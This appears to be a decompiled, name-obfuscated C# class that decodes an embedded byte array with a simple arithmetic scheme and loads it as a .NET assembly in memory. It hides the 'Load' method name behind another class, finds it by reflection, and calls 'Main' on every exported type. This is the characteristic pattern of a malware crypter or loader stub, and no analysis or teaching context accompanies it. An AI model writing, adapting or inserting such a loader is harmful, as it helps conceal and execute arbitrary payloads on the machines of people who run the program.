using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows;
using ns4;
using ns5;
using ns9;

namespace ns8;

internal sealed class Class4
{
	private static int i;

	internal static Assembly assembly;

	private static byte[] _array;

	private static GCHandle _pinningHandle;

	internal static void smethod_0()
	{
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			byte[] array = Class3.smethod_0();
			while (smethod_5(array))
			{
				if (smethod_3())
				{
					smethod_1(array);
				}
				smethod_4();
			}
			string assemblyLoad = Class2.assemblyLoad;
			MethodInfo method = typeof(Assembly).GetMethod(assemblyLoad, new Type[1] { typeof(byte[]) });
			assembly = (Assembly)((method != null) ? method.Invoke(null, new object[1] { array }) : null);
			if (!(assembly != null))
			{
				return;
			}
			foreach (Type exportedType in assembly.ExportedTypes)
			{
				byte[] array2 = Class3.smethod_0();
				if (array2.Length == 0)
				{
					array2 = new byte[1];
				}
				_array = array2;
				_pinningHandle = default(GCHandle);
				((Class5.Delegate0)Delegate.CreateDelegate(typeof(Class5.Delegate0), exportedType, "Main"))();
			}
		}
		catch (ArgumentNullException ex)
		{
			MessageBox.Show(ex.ToString(), "Error", (MessageBoxButton)0, (MessageBoxImage)16);
		}
	}

	private static void smethod_1(byte[] array)
	{
		array[i] = smethod_2(array);
	}

	private static byte smethod_2(byte[] array)
	{
		return (byte)(array[i] - 12 - 5);
	}

	private static bool smethod_3()
	{
		return i % 4 / 2 == 0;
	}

	private static int smethod_4()
	{
		return i++;
	}

	private static bool smethod_5(byte[] array)
	{
		return i < array.Length;
	}
}
